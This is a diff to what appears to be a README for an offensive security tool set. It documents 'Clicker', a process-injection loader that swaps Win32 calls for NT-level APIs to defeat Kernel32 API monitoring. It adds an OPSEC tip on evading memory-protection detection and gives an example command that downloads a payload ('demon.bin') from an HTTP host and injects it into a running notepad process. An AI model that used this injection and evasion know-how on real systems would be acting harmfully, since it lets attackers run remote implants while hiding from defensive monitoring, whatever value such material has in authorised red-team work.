@@ -74,9 +74,16 @@ Process Injector 1: Runner (Win32 API)
 ```
 
 ### Clicker
-Clicker is a Proof-of-Concept loader for code injection using NT\*API calls 
+Clicker is a Proof-of-Concept loader for code injection using NT\*API calls to defeat Kernel32 API Monitoring. All Win32 APIs are mapped to the respective NT level API as follows:
+| Win32 API          | NT\*API                                                      |
+|--------------------|--------------------------------------------------------------|
+| VirtualAllocEx     | NtAllocateVirtualMemory |
+| WriteProcessMemory | NtWriteVirtualMemory |
+| VirtualProtectEx   | NtProtectVirtualMemory |
+| CreateRemoteThread | NtCreateThreadEx |
 
-**OPSEC Tips:** Allocating RWX region is bad OPSEC. Always allocate RW then flip it to RX.
+
+**OPSEC Tips:** Allocating RWX region is a major outlier for detection as programs will rarely have memory region of RWX. Always allocate RW then flip it to RX.
 ```
 C:\>Clicker.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
 
